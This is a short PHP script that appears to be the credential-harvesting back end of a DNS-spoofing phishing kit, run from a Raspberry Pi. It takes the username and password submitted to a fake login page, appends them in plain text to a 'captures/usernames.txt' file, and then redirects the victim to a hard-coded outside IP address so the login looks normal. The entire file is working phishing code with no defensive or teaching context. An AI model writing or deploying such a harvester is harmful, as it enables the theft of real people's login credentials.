<?php

file_put_contents("/root/rpi_gui_map/DNSSpoof/captures/usernames.txt", "Account: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://91.211.164.17');
exit();
